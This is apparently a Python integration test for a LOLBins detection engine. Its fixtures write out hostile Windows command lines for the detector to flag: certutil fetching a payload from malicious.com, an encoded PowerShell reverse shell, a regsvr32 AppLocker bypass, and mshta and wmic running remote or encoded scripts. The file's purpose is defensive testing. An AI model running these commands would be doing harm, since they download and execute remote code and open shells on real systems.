import sys
import os
import logging
import time
import json
from datetime import datetime

# Fix the import path to include the src directory
src_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'src'))
sys.path.append(src_path)

# Now import our modules
from rules.enhanced_rule_engine import EnhancedRuleEngine
from alerts.alert_system import AlertManager
from utils.performance_monitor import PerformanceMonitor

class IntegrationTest:
    def __init__(self):
        # Setup logging
        self.setup_logging()
        
        # Initialize components
        whitelist_path = os.path.join(os.path.dirname(src_path), "whitelist.json")
        alert_config_path = os.path.join(os.path.dirname(src_path), "config.json")
        
        self.rule_engine = EnhancedRuleEngine(whitelist_path if os.path.exists(whitelist_path) else None)
        self.alert_manager = AlertManager(alert_config_path if os.path.exists(alert_config_path) else None)
        self.performance_monitor = PerformanceMonitor("integration_test_performance.json")
        
        # Test scenarios
        self.test_scenarios = self._generate_test_scenarios()
        
        logging.info("Integration test initialized")
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            filename='integration_test.log'
        )
        # Also log to console
        console = logging.StreamHandler()
        console.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        console.setFormatter(formatter)
        logging.getLogger('').addHandler(console)
    
    def _generate_test_scenarios(self):
        """Generate test scenarios for LOLBins detection"""
        return [
            # Malicious scenarios
            {
                'name': 'certutil.exe',
                'cmdline': ['certutil.exe', '-urlcache', '-f', 'http://malicious.com/payload.exe', 'C:\\temp\\harmless.exe'],
                'pid': 1001,
                'username': 'test_user',
                'expected_alert': True,
                'description': "CertUtil downloading executable from malicious domain"
            },
            {
                'name': 'powershell.exe',
                'cmdline': ['powershell.exe', '-EncodedCommand', 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxACIALAA0ADQANAA0ACkA'],
                'pid': 1002,
                'username': 'test_user',
                'expected_alert': True,
                'description': "PowerShell encoded command for reverse shell"
            },
            {
                'name': 'regsvr32.exe',
                'cmdline': ['regsvr32.exe', '/s', '/u', '/i:http://example.com/file.sct', 'scrobj.dll'],
                'pid': 1003,
                'username': 'test_user',
                'expected_alert': True,
                'description': "Regsvr32 AppLocker bypass technique"
            },
            {
                'name': 'mshta.exe',
                'cmdline': ['mshta.exe', 'javascript:a=GetObject("script:http://malicious.com/code.sct").Exec();close();'],
                'pid': 1004,
                'username': 'test_user',
                'expected_alert': True,
                'description': "MSHTA executing remote JavaScript"
            },
            {
                'name': 'wmic.exe',
                'cmdline': ['wmic.exe', 'process', 'call', 'create', 'powershell.exe -enc JABjAGwAaQBlAG4AdAA='],
                'pid': 1005,
                'username': 'test_user',
                'expected_alert': True,
                'description': "WMIC creating PowerShell process with encoded command"
            },
            
            # Legitimate scenarios (should not trigger alerts)
            {
                'name': 'certutil.exe',
                'cmdline': ['certutil.exe', '-verify', 'certificate.crt'],
                'pid': 2001,
                'username': 'test_user',
                'expected_alert': False,
                'description': "CertUtil legitimate certificate verification"
            },
            {
                'name': 'powershell.exe',
                'cmdline': ['powershell.exe', 'Get-Process'],
                'pid': 2002,
                'username': 'test_user',
                'expected_alert': False,
                'description': "PowerShell legitimate process listing"
            },
            {
                'name': 'regsvr32.exe',
                'cmdline': ['regsvr32.exe', 'C:\\Windows\\System32\\vbscript.dll'],
                'pid': 2003,
                'username': 'test_user',
                'expected_alert': False,
                'description': "Regsvr32 legitimate DLL registration"
            },
            
            # Whitelisted scenarios
            {
                'name': 'certutil.exe',
                'cmdline': ['certutil.exe', '-urlcache', '-f', 'https://www.microsoft.com/download.exe', 'C:\\temp\\update.exe'],
                'pid': 3001,
                'username': 'test_user',
                'expected_alert': False,
                'description': "CertUtil downloading from whitelisted domain"
            },
            {
                'name': 'regsvr32.exe',
                'cmdline': ['regsvr32.exe', '/s', '/n', '/i:/MLDisplayX.dll'],
                'pid': 3002,
                'username': 'test_user',
                'expected_alert': False,
                'description': "Regsvr32 with whitelisted command"
            }
        ]
    
    def run_tests(self):
        """Run all integration tests"""
        logging.info("Starting integration tests")
        
        # Start performance monitoring
        self.performance_monitor.start_monitoring(interval=5)
        
        results = {
            "total_tests": len(self.test_scenarios),
            "passed": 0,
            "failed": 0,
            "details": []
        }
        
        # Setup context for some scenarios
        self.rule_engine.update_process_history({'name': 'cmd.exe', 'username': 'test_user'})
        
        # Run each test scenario
        for i, scenario in enumerate(self.test_scenarios):
            test_id = i + 1
            logging.info(f"Running test {test_id}/{len(self.test_scenarios)}: {scenario['description']}")
            
            # Time the analysis for performance metrics
            start_time = time.time()
            alerts = self.rule_engine.analyze_process(scenario)
            execution_time = time.time() - start_time
            
            # Record performance metrics
            self.performance_monitor.record_process_analysis(execution_time)
            
            # Process alerts if any
            alert_generated = len(alerts) > 0
            for alert in alerts:
                self.alert_manager.send_alert(alert)
                self.performance_monitor.record_alert(alert['rule_name'])
            
            # Validate test results
            test_passed = alert_generated == scenario['expected_alert']
            
            if test_passed:
                results["passed"] += 1
                result_str = "PASSED"
            else:
                results["failed"] += 1
                result_str = "FAILED"
            
            logging.info(f"Test {test_id} {result_str}: {scenario['description']}")
            
            # Add detailed results
            results["details"].append({
                "test_id": test_id,
                "description": scenario['description'],
                "process": scenario['name'],
                "command": ' '.join(scenario['cmdline']),
                "expected_alert": scenario['expected_alert'],
                "actual_alert": alert_generated,
                "result": result_str,
                "execution_time_ms": round(execution_time * 1000, 2)
            })
            
            # Small delay between tests
            time.sleep(0.5)
        
        # Stop performance monitoring
        self.performance_monitor.stop_monitoring()
        
        # Generate summary
        results["success_rate"] = round((results["passed"] / results["total_tests"]) * 100, 2)
        results["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        results["performance"] = self.performance_monitor.get_performance_summary()
        
        # Save results
        with open('integration_test_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        # Log summary
        logging.info(f"Integration tests completed: {results['passed']}/{results['total_tests']} passed ({results['success_rate']}%)")
        
        return results

if __name__ == "__main__":
    test = IntegrationTest()
    results = test.run_tests()
    
    # Print summary
    print("\n==== Integration Test Summary ====")
    print(f"Total Tests: {results['total_tests']}")
    print(f"Passed: {results['passed']}")
    print(f"Failed: {results['failed']}")
    print(f"Success Rate: {results['success_rate']}%")
    print(f"Average Analysis Time: {results['performance']['ids']['avg_execution_time_ms']} ms")
    print("\nDetailed results saved to: integration_test_results.json")